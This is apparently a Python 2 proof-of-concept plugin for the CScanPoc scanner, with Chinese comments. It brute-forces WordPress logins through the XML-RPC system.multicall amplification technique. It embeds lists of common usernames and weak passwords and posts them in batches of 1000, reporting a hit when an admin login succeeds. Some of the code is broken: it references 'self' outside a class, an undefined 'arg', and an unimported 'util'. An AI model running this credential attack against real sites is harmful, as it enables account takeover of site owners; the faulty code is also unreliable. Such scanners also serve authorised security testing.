# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import re
import time

class Vuln(ABVuln):
    vuln_id = 'WordPress_0035' # 平台漏洞编号，留空
    name = 'WordPress XML-RPC WeakPassWd '  # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2015-10-08'  # 漏洞公布时间
    desc = '''
    '''  # 漏洞描述
    ref = 'https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress XML-RPC'  # 漏洞应用版本

hh = hackhttp.hackhttp()
def isExist(url):
    code, head, res, errcode, _ = hh.http(url)
    if 'XML-RPC server accepts POST requests only' in res: #本来有 code ==200 的 但是测试自己搭建的其他站点的时候  返回的是405 ，所以不判断状态码了
        return True
    return False

def checkMuticall(url):
    xml = '<methodCall>  <methodName>system.multicall</methodName>  <params><param>    <value><array><data>      <value><struct>        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>        <member><name>params</name><value><array><data>          <value><string>admin</string></value>          <value><string>testvula888</string></value>        </data></array></value></member>      </struct></value>      <value><struct>        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>        <member><name>params</name><value><array><data>          <value><string>guesttestvul888</string></value>          <value><string>test</string></value>        </data></array></value></member>      </struct></value>    </data></array></value>  </param></params></methodCall>'
    code, head, res, errcode, _ = hh.http(url,xml)
    if code == 200 and res.count('faultString') == 2: 
        return True
    return False

def weakPassword(url,list1):
    xml1 ='''
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param>
    <value><array><data>
    %s
    </data></array></value>
  </param></params>
</methodCall>
'''
    
    xml2 = '''
<value><struct> 
        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
        <member><name>params</name><value><array><data>
          <value><string>%s</string></value>
          <value><string>%s</string></value>
        </data></array></value></member>
</struct></value>
'''

    xml3 = ''
    for x in list1:
        xml3 = xml3 + xml2 % (x[0] ,x[1])
    xmlpayload = xml1 % (xml3 )
    code, head, res, errcode, _ = hh.http(url,xmlpayload)
    s = re.compile('isAdmin')
    for i in s.finditer(res):
        res2 = res.count('<value><struct>',0,i.start())
        #security_hole('user:%s pass:%s' % ( list1[res2-1][0] , list1[res2-1][1]))
        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
            target=self.target, name=self.vuln.name))
        return True

def getWeakList():
    topuser2 = ['root','wordpress', 'www','test','admin', 'system', 'sys', 'sysadm', 'sysadmin', 'manager', 'scmadmin', 'super', 'superuser', 'superadmin', 'superman', 'smc', 'webadmin', 'websecadm', 'wlse', 'wlseuser', 'wradmin', 'Guest', 'naadmin', 'netadmin', 'netman', 'adm', 'admin', 'admin2', 'administrator', 'adminstat', 'adminstrator', 'adminttd', 'adminuser', 'adminview', 'anonymous', 'Admin', 'Administrator', 'Alphanetworks', 'Anonymous', 'Any', 'ADMINISTRATOR', 'ADMN', 'security', 'mail']
    top100list = ['123456', 'wordpress','a123456', '123456a', '5201314', '111111', 'woaini1314', 'qq123456', '123123', '000000', '1qaz2wsx', '1q2w3e4r', 'qwe123', '7758521', '123qwe', 'a123123', '123456aa', 'woaini520', 'woaini', '100200', '1314520', 'woaini123', '123321', 'q123456', '123456789', '123456789a', '5211314', 'asd123', 'a123456789', 'z123456', 'asd123456', 'a5201314', 'aa123456', 'zhang123', 'aptx4869', '123123a', '1q2w3e4r5t', '1qazxsw2', '5201314a', '1q2w3e', 'aini1314', '31415926', 'q1w2e3r4', '123456qq', 'woaini521', '1234qwer', 'a111111', '520520', 'iloveyou', 'abc123', '110110', '111111a', '123456abc', 'w123456', '7758258', '123qweasd', '159753', 'qwer1234', 'a000000', 'qq123123', 'zxc123', '123654', 'abc123456', '123456q', 'qq5201314', '12345678', '000000a', '456852', 'as123456', '1314521', '112233', '521521', 'qazwsx123', 'zxc123456', 'abcd1234', 'asdasd', '666666', 'love1314', 'QAZ123', 'aaa123', 'q1w2e3', 'aaaaaa', 'a123321', '123000', '11111111', '12qwaszx', '5845201314', 's123456', 'nihao123', 'caonima123', 'zxcvbnm123', 'wang123', '159357', '1A2B3C4D', 'asdasd123', '584520', '753951', '147258', '1123581321', '110120', 'qq1314520','test']
  
    userpasswdlist = []
    for user in topuser2:
        for passwd in top100list:
            list1 = []
            list1.append(user)
            list1.append(passwd)
            userpasswdlist.append(list1)
    list2 = ['testvul','testvul']
    userpasswdlist.append(list2)
    return userpasswdlist

def loadSDKWeakPassWd(args):
    r = urlparse.urlparse(args)
    host = r.hostname
    sdklist = []
 
    pass_list = util.load_password_dict(
        host,
        userfile='/database/http_user.txt', 
        passfile='/database/http_pass.txt',
        userlist=None,
        passlist=None,
        mix=True,
        )
    sdklist = pass_list

    return sdklist

class Poc(ABPoc):
    poc_id = '68a8e873-fea1-460b-a913-ed76faff6d49'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = '/xmlrpc.php'
            url = self.target + payload
            if not isExist(url):
                return
            
            if not checkMuticall(url):
                return

            list1 = getWeakList()
            list2 = loadSDKWeakPassWd(arg)
            list3 = list1 + list2
            for i in range(0,len(list3),1000):  #对list进行分割提交 不然 一次提交太多，亲测服务器会溢出返回一个只有403字节的xml
                if weakPassword(url, list3[i:i+1000]):
                    return

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
